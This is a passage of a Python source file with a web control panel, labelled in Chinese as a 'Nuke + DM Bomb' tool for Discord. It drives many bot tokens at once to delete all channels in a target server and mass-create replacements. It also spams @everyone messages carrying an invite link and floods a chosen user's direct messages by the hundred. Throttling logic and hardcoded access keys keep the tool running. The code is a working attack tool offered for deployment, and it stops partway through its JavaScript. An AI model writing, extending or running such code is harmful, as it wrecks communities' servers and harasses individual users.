# -*- coding: utf-8 -*-
# D123 DIGITAL PANEL - Nuke + DM Bomb 合併版 (Web)
# Flask + discord.py + aiohttp，可部署到 Railway/Render/VPS
# pip install flask discord.py aiohttp

import asyncio
import json
import os
import queue
import sys
import threading
import time
import discord
from discord.ext import commands
from discord import app_commands, ChannelType
from flask import Flask, request, jsonify, Response
from collections import deque
import aiohttp

def _data_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

TOKENS_FILE = os.path.join(_data_dir(), 'd123_tokens.json')
AUTH_FILE = os.path.join(_data_dir(), 'authorized_users.json')
MAX_SAVED_TOKENS = 15

VALID_KEYS = ['092899', '0938', 'admin', 'freekey', 'zynuk3', 'zynuk3bot']
_saved_tokens = []

OWNER_ID = None
authorized_users = set()

def _load_tokens():
    global _saved_tokens
    try:
        if os.path.isfile(TOKENS_FILE):
            with open(TOKENS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                _saved_tokens = (data.get('tokens') or [])[:MAX_SAVED_TOKENS]
    except Exception:
        _saved_tokens = []

def _save_tokens():
    try:
        with open(TOKENS_FILE, 'w', encoding='utf-8') as f:
            json.dump({'tokens': _saved_tokens}, f, ensure_ascii=False)
    except Exception:
        pass

def load_authorized_users():
    global authorized_users
    try:
        if os.path.exists(AUTH_FILE):
            with open(AUTH_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                authorized_users = set(data.get('authorized_users', []))
    except Exception:
        authorized_users = set()

def save_authorized_users():
    try:
        with open(AUTH_FILE, 'w', encoding='utf-8') as f:
            json.dump({'authorized_users': list(authorized_users)}, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

_load_tokens()
load_authorized_users()

PROTECTED_GUILD_ID = 1318924113640947803
PROTECTED_CHANNEL_ID = 1462719159006920869
MAX_REQUESTS_PER_SECOND = 50
MAX_CONCURRENT_REQUESTS = 50
MAX_FAILED_PER_10MIN = 10000
RATE_LIMIT_WAIT_INTERVAL = 0.02
CHANNEL_CREATE_COUNT = 50
SPAM_ROUNDS = 50
SPAM_DELAY = 0.005
INVITE_LINK = "discord.gg/cA6bk89Mp7"

current_nuke_channel_count = CHANNEL_CREATE_COUNT
current_nuke_spam_rounds = SPAM_ROUNDS
current_nuke_spam_delay = SPAM_DELAY

DM_BOMB_DEFAULT_COUNT = 100
DM_BOMB_DELAY = 0.3

MAX_BOTS = 999999
multi_clients = []
multi_loops = []
multi_names = []
multi_ready_events = []
multi_lock = threading.Lock()

client = None
current_token = None
STOP_SIGNAL = False
DM_STOP_SIGNAL = False
discord_loop = None
log_queue = queue.Queue()
ready_event = threading.Event()
login_pending = False
login_result = None


class NukeBot(commands.Bot):
    def __init__(self, owner_id=None):
        intents = discord.Intents.default()
        intents.members = True
        intents.guilds = True
        intents.message_content = True
        intents.presences = True
        super().__init__(
            command_prefix='!',
            intents=intents,
            help_command=None,
            case_insensitive=True,
            owner_id=owner_id
        )
        self.session = None
        self._request_timestamps = deque()
        self._rate_limit_lock = asyncio.Lock()
        self._semaphore = None
        self.failed_requests = deque(maxlen=MAX_FAILED_PER_10MIN)
        self._owner_id = owner_id
        self._register_slash_commands()

    def _is_authorized(self, user_id):
        return user_id == OWNER_ID or user_id in authorized_users

    def _register_slash_commands(self):
        @self.event
        async def on_ready():
            global OWNER_ID, authorized_users
            if self._owner_id:
                OWNER_ID = self._owner_id
                authorized_users.add(OWNER_ID)
                save_authorized_users()
            try:
                synced = await self.tree.sync()
                put_log('[Bot] %s 已上線，同步 %d 個 slash 指令' % (str(self.user), len(synced)))
            except Exception as e:
                put_log('[Bot] %s 已上線，指令同步失敗: %s' % (str(self.user), e))

        @self.tree.command(name='增加權限', description='授予用戶使用權限（僅 Owner）')
        @app_commands.describe(user_id='要授權的用戶 ID')
        async def slash_add_auth(interaction: discord.Interaction, user_id: str):
            if interaction.user.id != OWNER_ID:
                await interaction.response.send_message('只有擁有者可使用此指令', ephemeral=True)
                return
            try:
                target = int(user_id)
                if target == OWNER_ID:
                    await interaction.response.send_message('該用戶已是擁有者', ephemeral=True)
                    return
                authorized_users.add(target)
                save_authorized_users()
                u = await self.fetch_user(target)
                await interaction.response.send_message('已授予 %s 使用權限' % u.name, ephemeral=True)
            except ValueError:
                await interaction.response.send_message('用戶ID格式錯誤', ephemeral=True)
            except discord.NotFound:
                await interaction.response.send_message('找不到該用戶', ephemeral=True)

        @self.tree.command(name='移除權限', description='移除用戶使用權限（僅 Owner）')
        @app_commands.describe(user_id='要移除權限的用戶 ID')
        async def slash_remove_auth(interaction: discord.Interaction, user_id: str):
            if interaction.user.id != OWNER_ID:
                await interaction.response.send_message('只有擁有者可使用此指令', ephemeral=True)
                return
            try:
                target = int(user_id)
                if target == OWNER_ID:
                    await interaction.response.send_message('無法移除擁有者權限', ephemeral=True)
                    return
                if target in authorized_users:
                    authorized_users.discard(target)
                    save_authorized_users()
                    u = await self.fetch_user(target)
                    await interaction.response.send_message('已移除 %s 的使用權限' % u.name, ephemeral=True)
                else:
                    await interaction.response.send_message('該用戶沒有權限', ephemeral=True)
            except ValueError:
                await interaction.response.send_message('用戶ID格式錯誤', ephemeral=True)

        @self.tree.command(name='查看權限', description='查看所有有權限的用戶（僅 Owner）')
        async def slash_list_auth(interaction: discord.Interaction):
            if interaction.user.id != OWNER_ID:
                await interaction.response.send_message('只有擁有者可使用此指令', ephemeral=True)
                return
            if len(authorized_users) <= 1:
                await interaction.response.send_message('目前沒有其他用戶有權限', ephemeral=True)
                return
            lines = []
            for uid in authorized_users:
                if uid != OWNER_ID:
                    try:
                        u = await self.fetch_user(uid)
                        lines.append('%s (%s)' % (u.name, u.id))
                    except Exception:
                        lines.append('未知用戶 (%s)' % uid)
            await interaction.response.send_message('有權限的用戶：\n' + '\n'.join(lines), ephemeral=True)

        @self.tree.command(name='dm', description='轟炸用戶私訊（預設100條）')
        @app_commands.describe(user_id='目標用戶 ID', message='要發送的訊息內容')
        async def slash_dm(interaction: discord.Interaction, user_id: str, message: str):
            if not self._is_authorized(interaction.user.id):
                await interaction.response.send_message('你沒有權限使用此指令', ephemeral=True)
                return
            await self._do_slash_dm_bomb(interaction, user_id, DM_BOMB_DEFAULT_COUNT, message)

        @self.tree.command(name='dmm', description='自訂數量轟炸私訊')
        @app_commands.describe(user_id='目標用戶 ID', amount='發送數量', message='要發送的訊息內容')
        async def slash_dmm(interaction: discord.Interaction, user_id: str, amount: int, message: str):
            if not self._is_authorized(interaction.user.id):
                await interaction.response.send_message('你沒有權限使用此指令', ephemeral=True)
                return
            await self._do_slash_dm_bomb(interaction, user_id, amount, message)

        @self.tree.command(name='dmmulti', description='多訊息轟炸私訊（用 | 分隔）')
        @app_commands.describe(user_id='目標用戶 ID', messages='訊息1|訊息2|訊息3')
        async def slash_dmmulti(interaction: discord.Interaction, user_id: str, messages: str):
            if not self._is_authorized(interaction.user.id):
                await interaction.response.send_message('你沒有權限使用此指令', ephemeral=True)
                return
            try:
                target_id = int(user_id)
            except ValueError:
                await interaction.response.send_message('用戶ID格式錯誤', ephemeral=True)
                return
            if target_id == OWNER_ID:
                await interaction.response.send_message('無法轟炸機器人擁有者', ephemeral=True)
                return
            if target_id == interaction.user.id:
                await interaction.response.send_message('無法轟炸自己', ephemeral=True)
                return
            try:
                target = await self.fetch_user(target_id)
            except discord.NotFound:
                await interaction.response.send_message('找不到該用戶ID', ephemeral=True)
                return
            msg_list = [m.strip() for m in messages.split('|') if m.strip()]
            if not msg_list:
                await interaction.response.send_message('請提供有效的訊息內容，用 | 分隔', ephemeral=True)
                return
            await interaction.response.send_message('開始多訊息轟炸 %s...' % target.name, ephemeral=True)
            global DM_STOP_SIGNAL
            DM_STOP_SIGNAL = False
            sent = 0
            for msg in msg_list:
                if DM_STOP_SIGNAL:
                    break
                try:
                    await target.send(msg)
                    sent += 1
                    await asyncio.sleep(DM_BOMB_DELAY)
                except discord.Forbidden:
                    await interaction.followup.send('無法發送私訊，用戶可能關閉了私訊權限', ephemeral=True)
                    return
                except Exception:
                    break
            await interaction.followup.send('已發送 %d 條私訊給 %s' % (sent, target.name), ephemeral=True)

    async def _do_slash_dm_bomb(self, interaction, user_id, amount, message):
        global DM_STOP_SIGNAL
        try:
            target_id = int(user_id)
        except ValueError:
            await interaction.response.send_message('用戶ID格式錯誤', ephemeral=True)
            return
        if target_id == OWNER_ID:
            await interaction.response.send_message('無法轟炸機器人擁有者', ephemeral=True)
            return
        if target_id == interaction.user.id:
            await interaction.response.send_message('無法轟炸自己', ephemeral=True)
            return
        try:
            target = await self.fetch_user(target_id)
        except discord.NotFound:
            await interaction.response.send_message('找不到該用戶ID', ephemeral=True)
            return
        await interaction.response.send_message('開始轟炸 %s，目標 %d 條...' % (target.name, amount), ephemeral=True)
        DM_STOP_SIGNAL = False
        sent = 0
        for i in range(amount):
            if DM_STOP_SIGNAL:
                break
            try:
                await target.send(message)
                sent += 1
                await asyncio.sleep(DM_BOMB_DELAY)
            except discord.Forbidden:
                await interaction.followup.send('無法發送私訊，用戶可能關閉了私訊權限', ephemeral=True)
                return
            except Exception:
                break
        await interaction.followup.send('已轟炸 %d 條私訊給 %s' % (sent, target.name), ephemeral=True)

    async def setup_hook(self):
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
        self.session = aiohttp.ClientSession(
            connector=connector,
            headers={"Authorization": f"Bot {self.http.token}"}
        )
        self._semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        put_log("[Nuke] Session 已初始化")

    async def close(self):
        if self.session:
            await self.session.close()
        await super().close()

    async def is_rate_limited(self):
        async with self._rate_limit_lock:
            now = time.time()
            while self._request_timestamps and now - self._request_timestamps[0] >= 1.0:
                self._request_timestamps.popleft()
            return len(self._request_timestamps) >= MAX_REQUESTS_PER_SECOND

    async def wait_for_rate_limit(self):
        while await self.is_rate_limited():
            await asyncio.sleep(RATE_LIMIT_WAIT_INTERVAL)

    async def record_request(self):
        async with self._rate_limit_lock:
            self._request_timestamps.append(time.time())

    def record_failed(self):
        self.failed_requests.append(time.time())

    def too_many_failed(self):
        now = time.time()
        recent = sum(1 for t in self.failed_requests if now - t <= 600)
        return recent >= MAX_FAILED_PER_10MIN

    async def safe_request(self, method: str, url: str, max_retries: int = 3, **kwargs):
        if self.too_many_failed():
            return 0, None
        for attempt in range(max_retries):
            async with self._semaphore:
                await self.wait_for_rate_limit()
                await self.record_request()
                try:
                    async with self.session.request(method, url, **kwargs) as resp:
                        status = resp.status
                        body = await resp.read()
                        if status == 429:
                            try:
                                data = json.loads(body)
                                retry_after = float(data.get("retry_after", 1.0))
                            except Exception:
                                retry_after = 1.0
                            if attempt < max_retries - 1:
                                await asyncio.sleep(retry_after)
                                continue
                            self.record_failed()
                        elif status in (401, 403):
                            self.record_failed()
                        return status, body
                except Exception:
                    self.record_failed()
                    if attempt == max_retries - 1:
                        return 0, None
        return 0, None

    async def delete_channel(self, channel_id: int):
        url = f"https://discord.com/api/v10/channels/{channel_id}"
        status, _ = await self.safe_request("DELETE", url)
        return status in (200, 204)

    async def create_channel(self, guild_id: int, name: str):
        url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
        payload = {"name": name, "type": 0, "permission_overwrites": []}
        status, body = await self.safe_request("POST", url, json=payload)
        if status == 201 and body:
            try:
                data = json.loads(body)
                return int(data.get("id"))
            except Exception:
                pass
        return None

    async def send_message(self, channel_id: int, content: str = ""):
        url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
        payload = {"content": content or f"# @everyone by zynuk3bot {INVITE_LINK}"}
        status, _ = await self.safe_request("POST", url, json=payload)
        return status == 200

    async def mass_delete_channels(self, guild_id: int):
        if guild_id == PROTECTED_GUILD_ID:
            put_log("[Nuke] 拒絕刪除保護伺服器")
            return
        guild = self.get_guild(guild_id)
        if not guild:
            put_log(f"[Nuke] 找不到伺服器 {guild_id}")
            return
        channels = [
            ch for ch in guild.text_channels + guild.voice_channels + list(guild.categories)
            if ch.id != PROTECTED_CHANNEL_ID
        ]
        put_log(f"[Nuke] 刪除 {len(channels)} 個頻道...")
        tasks = [self.delete_channel(ch.id) for ch in channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in results if r is True)
        put_log(f"[Nuke] 已刪除 {success}/{len(channels)} 個頻道")

    async def mass_create_channels(self, guild_id: int, count: int = None):
        global current_nuke_channel_count
        n = count if count is not None else current_nuke_channel_count
        if guild_id == PROTECTED_GUILD_ID:
            put_log("[Nuke] 拒絕在保護伺服器創建頻道")
            return []
        put_log(f"[Nuke] 創建 {n} 個頻道...")
        tasks = [self.create_channel(guild_id, f"zynuk3-{i+1:03d}") for i in range(n)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        created = [r for r in results if isinstance(r, int)]
        put_log(f"[Nuke] 已創建 {len(created)}/{n} 個頻道")
        return created

    async def mass_send_messages(self, channel_ids: list, content: str = None, rounds: int = None, delay: float = None):
        global current_nuke_spam_rounds, current_nuke_spam_delay
        rnd = rounds if rounds is not None else current_nuke_spam_rounds
        dly = delay if delay is not None else current_nuke_spam_delay
        if not channel_ids:
            return 0
        total_sent = 0
        consecutive_failures = 0
        msg = content or f"# @everyone by zynuk3bot {INVITE_LINK}"
        put_log(f"[Nuke] 發送: {len(channel_ids)} 頻道 x {rnd} 輪")
        for batch in range(rnd):
            if STOP_SIGNAL:
                break
            tasks = [self.send_message(cid, msg) for cid in channel_ids]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            sent = sum(1 for r in results if r is True)
            total_sent += sent
            if sent > 0:
                consecutive_failures = 0
            else:
                consecutive_failures += 1
            if (batch + 1) % 10 == 0:
                put_log(f"[Nuke] 第 {batch+1}/{rnd} 輪, 總計 {total_sent} 條")
            if consecutive_failures >= 5:
                put_log("[Nuke] 連續失敗，停止發送")
                break
            await asyncio.sleep(dly)
        put_log(f"[Nuke] 發送完成，總計 {total_sent} 條")
        return total_sent

    async def panel_dm_bomb(self, target_user_id: int, message: str, amount: int = 100):
        global DM_STOP_SIGNAL
        DM_STOP_SIGNAL = False
        try:
            target = await self.fetch_user(target_user_id)
        except discord.NotFound:
            put_log('[DM] 找不到用戶 %s' % target_user_id)
            return 0
        except Exception as e:
            put_log('[DM] 錯誤: %s' % e)
            return 0
        put_log('[DM] 開始轟炸 %s，目標 %d 條' % (target.name, amount))
        sent = 0
        for i in range(amount):
            if DM_STOP_SIGNAL:
                put_log('[DM] 收到停止訊號，已發送 %d 條' % sent)
                break
            try:
                await target.send(message)
                sent += 1
                if sent % 10 == 0:
                    put_log('[DM] 已發送 %d/%d 條' % (sent, amount))
                await asyncio.sleep(DM_BOMB_DELAY)
            except discord.Forbidden:
                put_log('[DM] 用戶已關閉私訊權限，停止')
                break
            except Exception as e:
                put_log('[DM] 發送錯誤: %s' % e)
                break
        put_log('[DM] 完成，總計發送 %d 條給 %s' % (sent, target.name))
        return sent

    async def panel_dm_multi(self, target_user_id: int, messages: list):
        global DM_STOP_SIGNAL
        DM_STOP_SIGNAL = False
        try:
            target = await self.fetch_user(target_user_id)
        except discord.NotFound:
            put_log('[DM] 找不到用戶 %s' % target_user_id)
            return 0
        except Exception as e:
            put_log('[DM] 錯誤: %s' % e)
            return 0
        put_log('[DM] 多訊息轟炸 %s，共 %d 條訊息' % (target.name, len(messages)))
        sent = 0
        for msg in messages:
            if DM_STOP_SIGNAL:
                break
            try:
                await target.send(msg)
                sent += 1
                await asyncio.sleep(DM_BOMB_DELAY)
            except discord.Forbidden:
                put_log('[DM] 用戶已關閉私訊權限，停止')
                break
            except Exception:
                break
        put_log('[DM] 多訊息完成，總計 %d 條' % sent)
        return sent


def init_bot():
    global client
    if client:
        try:
            if discord_loop:
                asyncio.run_coroutine_threadsafe(client.close(), discord_loop).result(timeout=5)
        except Exception:
            pass
        client = None
    client = NukeBot()


def _run_one_bot(slot: int, token: str, owner_id=None):
    global multi_clients, multi_loops, multi_names, multi_ready_events
    bot = NukeBot(owner_id=owner_id)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    with multi_lock:
        while len(multi_clients) <= slot:
            multi_clients.append(None)
            multi_loops.append(None)
            multi_names.append(None)
        multi_clients[slot] = bot
        multi_loops[slot] = loop

    name_holder = [None]

    @bot.event
    async def on_ready():
        name_holder[0] = str(bot.user)
        if slot < len(multi_ready_events):
            multi_ready_events[slot].set()
        with multi_lock:
            if slot < len(multi_names):
                multi_names[slot] = name_holder[0]

    try:
        loop.run_until_complete(bot.start(token))
    except Exception:
        pass


def put_log(msg):
    log_queue.put(msg)


def clear_log_queue():
    try:
        while True:
            log_queue.get_nowait()
    except queue.Empty:
        pass


HTML_TEMPLATE = r'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>D123 DIGITAL PANEL</title>
    <style>
        * { box-sizing: border-box; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #0a0a0f; color: #e0e0e0; font-family: 'Microsoft JhengHei', 'Segoe UI', sans-serif; overflow: hidden; }
        #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; }
        .container { display: flex; height: 100vh; background: linear-gradient(135deg, rgba(20,20,30,0.97) 0%, rgba(10,10,18,0.98) 100%); }
        .sidebar { width: 320px; background: linear-gradient(180deg, rgba(30,28,40,0.95) 0%, rgba(18,16,28,0.98) 100%); border-right: 1px solid rgba(212,175,55,0.4); padding: 28px 20px; display: flex; flex-direction: column; box-shadow: 4px 0 24px rgba(0,0,0,0.4); overflow-y: auto; }
        .main { flex: 1; padding: 32px; overflow-y: auto; background: transparent; }
        .card { background: linear-gradient(145deg, rgba(40,38,55,0.9) 0%, rgba(28,26,42,0.95) 100%); border: 1px solid rgba(212,175,55,0.25); padding: 24px; border-radius: 12px; margin-bottom: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); transition: transform 0.2s, box-shadow 0.2s; }
        .card:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(212,175,55,0.08); }
        h1 { color: #d4af37; letter-spacing: 3px; margin: 0 0 20px 0; font-weight: 700; text-shadow: 0 0 20px rgba(212,175,55,0.3); }
        h2 { color: #c9a227; letter-spacing: 2px; margin: 0 0 16px 0; font-size: 1.1em; font-weight: 600; }
        .monitor { background: rgba(0,0,0,0.35); border: 1px solid rgba(212,175,55,0.2); padding: 18px; border-radius: 10px; margin-top: 16px; }
        .stat-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; color: #aaa; }
        .stat-val { color: #d4af37; font-weight: 600; }
        input, textarea, select { background: rgba(20,18,30,0.9); border: 1px solid rgba(212,175,55,0.35); color: #e0e0e0; padding: 12px 14px; width: 100%; margin-bottom: 12px; border-radius: 8px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
        input:focus, textarea:focus, select:focus { border-color: #d4af37; box-shadow: 0 0 0 2px rgba(212,175,55,0.2); }
        .btn-panel { background: linear-gradient(180deg, #d4af37 0%, #b8860b 100%); color: #1a1a1a; border: none; padding: 12px 20px; cursor: pointer; font-weight: 700; border-radius: 8px; transition: all 0.2s; margin-right: 8px; box-shadow: 0 4px 14px rgba(212,175,55,0.35); }
        .btn-panel:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(212,175,55,0.45); filter: brightness(1.1); }
        .btn-panel:active { transform: translateY(0); }
        .btn-danger { background: transparent; border: 1px solid #e74c3c; color: #e74c3c; }
        .btn-danger:hover { background: rgba(231,76,60,0.15); }
        .btn-logout { background: rgba(60,55,80,0.8); border: 1px solid rgba(212,175,55,0.4); color: #d4af37; margin-top: auto; padding: 14px 20px; cursor: pointer; border-radius: 8px; font-weight: 600; transition: all 0.2s; position: relative; z-index: 10; }
        .btn-logout:hover { background: rgba(212,175,55,0.2); box-shadow: 0 0 20px rgba(212,175,55,0.2); }
        .btn-logout:disabled { opacity: 0.6; cursor: not-allowed; }
        .token-slot { margin-bottom: 6px; }
        .token-list { max-height: 100px; overflow-y: auto; margin-top: 8px; border-radius: 6px; background: rgba(0,0,0,0.25); padding: 6px; }
        .token-item { padding: 8px 12px; margin-bottom: 4px; background: rgba(212,175,55,0.08); border-radius: 6px; cursor: pointer; font-size: 12px; color: #aaa; transition: background 0.2s, color 0.2s; }
        .token-item:hover { background: rgba(212,175,55,0.18); color: #d4af37; }
        .glow-line { position: fixed; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.6), transparent); z-index: 1; pointer-events: none; animation: glowLine 4s linear infinite; }
        @keyframes glowLine { 0% { top: -2px; } 100% { top: 100%; } }
        #logs { height: 260px; background: rgba(0,0,0,0.4); border: 1px solid rgba(212,175,55,0.2); padding: 16px; color: #999; font-size: 12px; overflow-y: auto; border-left: 3px solid #d4af37; border-radius: 0 8px 8px 0; }
        .row2 { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 12px; align-items: center; }
        .row2 label { color: #999; font-size: 13px; }
        .pulse { animation: pulse 2s ease-in-out infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.7; } }
        .section-divider { height: 1px; background: linear-gradient(90deg, transparent, rgba(212,175,55,0.3), transparent); margin: 20px 0; }
        .tab-bar { display: flex; gap: 4px; margin-bottom: 20px; }
        .tab { padding: 10px 24px; cursor: pointer; border-radius: 8px 8px 0 0; font-weight: 600; font-size: 14px; transition: all 0.2s; border: 1px solid transparent; }
        .tab.active { background: rgba(212,175,55,0.15); border-color: rgba(212,175,55,0.4); color: #d4af37; }
        .tab:not(.active) { color: #888; border-color: transparent; }
        .tab:not(.active):hover { color: #c9a227; background: rgba(212,175,55,0.05); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .auth-list { max-height: 120px; overflow-y: auto; margin-top: 8px; border-radius: 6px; background: rgba(0,0,0,0.25); padding: 6px; }
        .auth-item { padding: 6px 10px; margin-bottom: 3px; font-size: 12px; color: #aaa; display: flex; justify-content: space-between; align-items: center; }
        .auth-item button { background: rgba(231,76,60,0.2); border: 1px solid #e74c3c; color: #e74c3c; padding: 2px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; }
        .auth-item button:hover { background: rgba(231,76,60,0.35); }
    </style>
</head>
<body>
    <div class="glow-line" id="glow-line"></div>
    <canvas id="bg-canvas"></canvas>
    <div id="login-box" style="position:fixed; width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:2000; background: linear-gradient(135deg, #0a0a12 0%, #1a1525 100%);">
        <h1 style="font-size: 42px; color: #d4af37; text-shadow: 0 0 40px rgba(212,175,55,0.4); letter-spacing: 6px;">D123 DIGITAL</h1>
        <input type="password" id="auth-key" placeholder="輸入授權碼" style="width:300px; text-align:center; margin-top:28px; padding:14px; border-radius:8px; border:1px solid rgba(212,175,55,0.5); background: rgba(20,18,30,0.9); color:#fff;">
        <button class="btn-panel" id="login-btn" onclick="checkKey()" style="width:300px; margin-top:16px;">登入核心</button>
        <p id="login-msg" style="margin-top:16px; font-size:13px; color:#888;"></p>
    </div>
    <div id="app-content" class="container" style="display:none;">
        <div class="sidebar">
            <h1>D123 核心</h1>
            <div class="card" style="padding:18px;">
                <h2>多機器人同時連線</h2>
                <p style="font-size:11px; color:#888; margin:0 0 10px 0;">動態新增任意數量 Token，無上限</p>
                <div id="token-slots"></div>
                <button class="btn-panel" onclick="addTokenSlot()" style="width:100%; margin-bottom:8px; background:rgba(60,55,80,0.8); color:#d4af37; border:1px solid rgba(212,175,55,0.4);">+ 新增 Token 欄位</button>
                <div class="row2" style="margin-top:8px;">
                    <label>Owner ID：</label>
                    <input type="text" id="owner-id" placeholder="機器人擁有者 ID" style="width:160px; margin-bottom:0;">
                </div>
                <button class="btn-panel" id="connect-btn" onclick="connectAllBots()" style="width:100%; margin-top:6px;">連線全部機器人</button>
                <div class="token-list" id="token-list"></div>
            </div>
            <div class="monitor">
                <div class="stat-row"><span>系統時間</span> <span class="stat-val" id="time-display">--:--:--</span></div>
                <div class="stat-row"><span>連線狀態</span> <span id="bot-status" style="color:#95a5a6;">-- 離線</span></div>
                <div class="stat-row"><span>機器人</span> <span class="stat-val" id="bot-name">0 隻未連線</span></div>
                <div class="stat-row"><span>授權用戶</span> <span class="stat-val" id="auth-count">0</span></div>
            </div>
            <button class="btn-logout" id="logout-btn" onclick="triggerLogout()">登出系統</button>
        </div>
        <div class="main">
            <div class="tab-bar">
                <div class="tab active" onclick="switchTab('nuke')">Nuke 炸群</div>
                <div class="tab" onclick="switchTab('dm')">DM 私訊轟炸</div>
                <div class="tab" onclick="switchTab('auth')">權限管理</div>
            </div>

            <div id="tab-nuke" class="tab-content active">
                <div class="card">
                    <h2>擴張設定</h2>
                    <div class="row2">
                        <label>伺服器：</label>
                        <select id="gid" style="width:220px;"><option value="">-- 選擇或手動輸入 ID --</option></select>
                        <input type="text" id="gid-text" placeholder="或輸入伺服器 ID" style="width:180px; margin-bottom:0;">
                    </div>
                    <textarea id="msg" rows="3">@everyone D123 接管中...</textarea>
                    <div class="row2">
                        <label>頻道數/隻：</label><input type="number" id="channel_count" value="80" min="1" max="100" style="width:80px;">
                        <label>發送輪數：</label><input type="number" id="spam_rounds" value="80" min="1" max="200" style="width:80px;">
                        <label>輪間隔(秒)：</label><input type="number" id="spam_delay" value="0.002" min="0.001" step="0.001" style="width:90px;">
                    </div>
                </div>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <button class="btn-panel" onclick="send('expand')">啟動擴張</button>
                    <button class="btn-panel btn-danger" onclick="send('purge')">清空頻道</button>
                    <button class="btn-panel" style="background:#444;" onclick="send('stop')">全面停止</button>
                    <button class="btn-panel" style="background:#333;" onclick="clearLogs()">清除日誌</button>
                </div>
            </div>

            <div id="tab-dm" class="tab-content">
                <div class="card">
                    <h2>私訊轟炸</h2>
                    <div class="row2">
                        <label>目標用戶 ID：</label>
                        <input type="text" id="dm-target" placeholder="輸入要轟炸的用戶 ID" style="width:300px; margin-bottom:0;">
                    </div>
                    <div class="row2">
                        <label>發送數量：</label>
                        <input type="number" id="dm-amount" value="100" min="1" max="10000" style="width:100px; margin-bottom:0;">
                        <label>間隔(秒)：</label>
                        <input type="number" id="dm-delay" value="0.3" min="0.1" step="0.1" style="width:80px; margin-bottom:0;">
                    </div>
                    <textarea id="dm-message" rows="3" placeholder="輸入要發送的訊息內容">D123 私訊轟炸中...</textarea>
                    <div class="section-divider"></div>
                    <h2>多訊息轟炸（用 | 分隔）</h2>
                    <textarea id="dm-multi-message" rows="4" placeholder="訊息1|訊息2|訊息3">訊息一|訊息二|訊息三</textarea>
                </div>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <button class="btn-panel" onclick="dmBomb()">啟動轟炸</button>
                    <button class="btn-panel" onclick="dmMultiBomb()">多訊息轟炸</button>
                    <button class="btn-panel" style="background:#444;" onclick="dmStop()">停止轟炸</button>
                </div>
            </div>

            <div id="tab-auth" class="tab-content">
                <div class="card">
                    <h2>權限管理</h2>
                    <div class="row2">
                        <label>用戶 ID：</label>
                        <input type="text" id="auth-user-id" placeholder="輸入要授權的用戶 ID" style="width:300px; margin-bottom:0;">
                    </div>
                    <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 16px;">
                        <button class="btn-panel" onclick="addAuth()">增加權限</button>
                        <button class="btn-panel btn-danger" onclick="removeAuth()">移除權限</button>
                        <button class="btn-panel" style="background:#333;" onclick="refreshAuth()">刷新列表</button>
                    </div>
                    <div class="auth-list" id="auth-list"></div>
                </div>
            </div>

            <div id="logs" style="margin-top:20px;"><div>[系統] 動態新增任意數量 Token 後點連線，即可使用 Nuke 炸群 + DM 轟炸 + 權限管理</div></div>
        </div>
    </div>
    <script>
        var canvas = document.getElementById('bg-canvas');
        var ctx = canvas.getContext('2d');

        function apiPost(path, body) {
            return fetch(path, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body || {}) }).then(function(r) { return r.json(); });
        }
        function apiGet(path) {
            return fetch(path).then(function(r) { return r.json(); });
        }

        function switchTab(name) {
            document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
            document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
            event.target.classList.add('active');
            document.getElementById('tab-' + name).classList.add('active');
        }

        (function() {
            var msgEl = document.getElementById('login-msg');
            if (msgEl) msgEl.innerText = '可輸入授權碼登入';
        })();

        function checkKey() {
            var btn = document.getElementById('login-btn');
            var msgEl = document.getElementById('login-msg');
            var key = document.getElementById('auth-key').value;
            if (!key || !key.trim()) { alert('請輸入授權碼'); return; }
            btn.disabled = true;
            btn.innerText = '驗證中...';
            if (msgEl) msgEl.innerText = '驗證授權碼...';
            apiPost('/api/check_key', { key: key }).then(function(result) {
                btn.disabled = false;
                btn.innerText = '登入核心';
                if (msgEl) msgEl.innerText = '';
                if (result && result[0] === true) {
                    document.getElementById('login-box').style.display = 'none';
                    document.getElementById('app-content').style.display = 'flex';
                    loadTokens();
                    refreshGuilds();
                    refreshAuth();
                } else {
                    alert(result && result[1] ? result[1] : '授權碼無效');
                }
            }).catch(function() {
                btn.disabled = false;
                btn.innerText = '登入核心';
                if (msgEl) msgEl.innerText = '';
                alert('連線失敗，請重試');
            });
        }

        function loadTokens() {
            apiGet('/api/get_tokens').then(function(arr) {
                var el = document.getElementById('token-list');
                if (!el) return;
                el.innerHTML = '<span style="color:#666; font-size:11px;">點選填入第一個空欄位：</span>';
                (arr || []).forEach(function(o) {
                    var btn = document.createElement('div');
                    btn.className = 'token-item';
                    btn.textContent = (o.masked || '...');
                    btn.onclick = function() { fillFirstEmptySlot(o.index); };
                    el.appendChild(btn);
                });
            });
        }

        var tokenSlotCount = 0;
